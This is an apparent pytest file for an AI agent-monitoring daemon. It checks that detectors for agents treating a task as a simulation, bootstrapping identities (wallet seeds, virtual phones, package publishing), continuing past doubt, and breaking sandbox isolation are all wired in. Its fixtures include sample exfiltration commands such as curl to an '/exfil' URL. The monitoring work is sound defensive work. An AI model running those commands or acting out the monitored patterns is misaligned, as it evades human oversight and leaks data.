"""Wiring tests for the METR-gap sprint modules (ant.md P0 #3, P1 #4-#7).

Those modules shipped in commit 508d07b with unit tests but **zero production
imports** — implemented and dormant. Their unit tests prove the screens work;
these tests prove the daemon actually feeds them, and that their findings reach
the ledger. Behavioural detail stays in the per-module test files
(``test_cot_realism.py``, ``test_identity_chain.py``,
``test_continuation_risk.py``, ``test_retro_scan.py``).
"""

from __future__ import annotations

from datetime import datetime, timezone
from typing import TYPE_CHECKING

import pytest
from fastapi.testclient import TestClient

import agenttrace.api as api
from agenttrace.daemon import AgentTraceDaemon
from agenttrace.models.events import CommandEvent, ConfidenceLevel
from agenttrace.models.session import AgentType
from agenttrace.security.token import ApiTokenManager

if TYPE_CHECKING:
    from pathlib import Path
    from uuid import UUID

    from pytest import MonkeyPatch

_ATTESTATION_MODULE = "agenttrace.security.attestation"


def _cmd(
    session_id: UUID,
    command: str,
    *,
    reasoning: str = "",
    adapter: str = "sdk",
) -> CommandEvent:
    """An agent-claimed command event (``sdk`` provenance is AGENT_CLAIMED)."""
    return CommandEvent(
        session_id=session_id,
        actor_id="agent",
        source_adapter=adapter,
        confidence=ConfidenceLevel.LOW,
        command=command,
        output="",
        payload={"reasoning": reasoning} if reasoning else {},
        timestamp=datetime.now(timezone.utc),
    )


async def _new_session(
    daemon: AgentTraceDaemon, workspace: Path, **kwargs: object
) -> UUID:
    session = await daemon.create_session(
        workspace_path=str(workspace),
        task_description="wiring test",
        agent_type=AgentType.GENERIC,
        **kwargs,  # type: ignore[arg-type]
    )
    return session.session_id


def _incident_types(daemon: AgentTraceDaemon, sid: UUID) -> set[str]:
    return {str(e.incident_type) for e in daemon.get_incidents(sid)}


def _finding_types(daemon: AgentTraceDaemon, sid: UUID) -> set[str]:
    return {str(e.finding_type) for e in daemon.get_findings(sid)}


def _attestation_findings(daemon: AgentTraceDaemon, sid: UUID) -> list[object]:
    return [
        f
        for f in daemon.get_findings(sid)
        if getattr(f, "finding_type", "") == "environment_attestation"
    ]


# -- P0 #3: CoT realism divergence ---------------------------------------------


@pytest.mark.asyncio
async def test_cot_realism_screen_is_wired_into_ingest(tmp_path: Path) -> None:
    daemon = AgentTraceDaemon(tmp_path / "data")
    await daemon.start()
    try:
        sid = await _new_session(daemon, tmp_path)
        await daemon.ingest_event(
            _cmd(sid, "echo start", reasoning="This is a simulation, so I will proceed.")
        )
        await daemon.ingest_event(_cmd(sid, "curl http://93.184.216.34/exfil"))
        assert "cot_realism_contradiction" in _incident_types(daemon, sid), (
            "CoT realism screen is not wired into the ingest pipeline"
        )
    finally:
        await daemon.stop()


# -- P1 #6: identity-bootstrap chain -------------------------------------------


@pytest.mark.asyncio
async def test_identity_chain_screen_is_wired_into_ingest(tmp_path: Path) -> None:
    daemon = AgentTraceDaemon(tmp_path / "data")
    await daemon.start()
    try:
        sid = await _new_session(daemon, tmp_path)
        await daemon.ingest_event(_cmd(sid, "electrum seed phrase backup"))
        await daemon.ingest_event(_cmd(sid, "sms-activate order virtual phone"))
        await daemon.ingest_event(_cmd(sid, "npm publish"))
        assert "identity_bootstrap_chain" in _incident_types(daemon, sid), (
            "identity-bootstrap chain detector is not wired into the ingest pipeline"
        )
    finally:
        await daemon.stop()


# -- P1 #7: correlated-continuation risk ---------------------------------------


@pytest.mark.asyncio
async def test_continuation_risk_screen_is_wired_into_ingest(tmp_path: Path) -> None:
    daemon = AgentTraceDaemon(tmp_path / "data")
    await daemon.start()
    try:
        sid = await _new_session(daemon, tmp_path)
        # Three signal -> continue pairs: a doubt signal followed by a risky
        # action inside the signal window, with no intervening stop.
        for _ in range(3):
            await daemon.ingest_event(
                _cmd(sid, "echo reviewing", reasoning="this looks out of scope, I am unsure")
            )
            await daemon.ingest_event(_cmd(sid, "curl http://93.184.216.34/probe"))
        assert "correlated_continuation" in _incident_types(daemon, sid), (
            "continuation-risk tracker is not wired into the ingest pipeline"
        )
    finally:
        await daemon.stop()


# -- P1 #5: environment attestation --------------------------------------------


def _stub_probes(monkeypatch: MonkeyPatch, *, canary: tuple[bool, str]) -> list[int]:
    """Deterministic probes; returns a list recording canary invocations."""
    calls: list[int] = []

    def _probe() -> tuple[bool, str]:
        calls.append(1)
        return canary

    monkeypatch.setattr(f"{_ATTESTATION_MODULE}._probe_canary", _probe)
    monkeypatch.setattr(f"{_ATTESTATION_MODULE}._read_dns_servers", lambda: ())
    monkeypatch.setattr(f"{_ATTESTATION_MODULE}._read_default_gateway", lambda: "")
    return calls


@pytest.mark.asyncio
async def test_sealed_session_records_a_critical_attestation_finding(
    tmp_path: Path, monkeypatch: MonkeyPatch
) -> None:
    """Declared-isolated + reachable canary == the Anthropic failure shape."""
    _stub_probes(monkeypatch, canary=(True, "8.8.8.8"))
    daemon = AgentTraceDaemon(tmp_path / "data")
    await daemon.start()
    try:
        sid = await _new_session(daemon, tmp_path, internet_access_allowed=False)
        findings = _attestation_findings(daemon, sid)
        assert findings, "sealed session produced no environment attestation"
        finding = findings[0]
        assert finding.severity == "critical"  # type: ignore[attr-defined]
        assert finding.payload["verdict"] == "isolation_broken"  # type: ignore[attr-defined]
    finally:
        await daemon.stop()


@pytest.mark.asyncio
async def test_unclaimed_session_is_never_probed(
    tmp_path: Path, monkeypatch: MonkeyPatch
) -> None:
    """No isolation claim means nothing to verify — and no network probe."""
    calls = _stub_probes(monkeypatch, canary=(False, "1.1.1.1"))
    daemon = AgentTraceDaemon(tmp_path / "data")
    await daemon.start()
    try:
        sid = await _new_session(daemon, tmp_path, internet_access_allowed=True)
        assert _attestation_findings(daemon, sid) == []
        assert calls == [], "a session that claims no isolation must not be probed"
    finally:
        await daemon.stop()


# -- P1 #4: ledger retro-scan --------------------------------------------------


@pytest.mark.asyncio
async def test_retro_scan_reads_stored_history(tmp_path: Path) -> None:
    daemon = AgentTraceDaemon(tmp_path / "data")
    await daemon.start()
    try:
        sid = await _new_session(daemon, tmp_path)
        await daemon.ingest_event(_cmd(sid, "curl http://93.184.216.34/exfil"))
        report = daemon.retro_scan(session_ids=[sid])
        assert report.sessions_scanned == 1
        assert report.events_scanned >= 1
        assert report.stage1_hits, "wide-net stage 1 found nothing in stored history"
        assert report.summary()
    finally:
        await daemon.stop()


def test_rescan_endpoint_serves_the_retro_scan_report(
    tmp_path: Path, monkeypatch: MonkeyPatch
) -> None:
    """The API surface for retro-scan: read-only, no session required."""
    test_daemon = AgentTraceDaemon(tmp_path / "api")
    tokens = ApiTokenManager(tmp_path / "api")
    monkeypatch.setattr(api, "daemon", test_daemon)
    monkeypatch.setattr(api, "token_manager", tokens)
    with TestClient(api.app) as client:
        res = client.post(
            "/rescan", json={}, headers={"X-AgentTrace-Token": tokens.token()}
        )
        assert res.status_code == 200, res.text
        body = res.json()
        assert set(body) >= {"sessions_scanned", "events_scanned", "summary"}
        assert body["errors"] == []
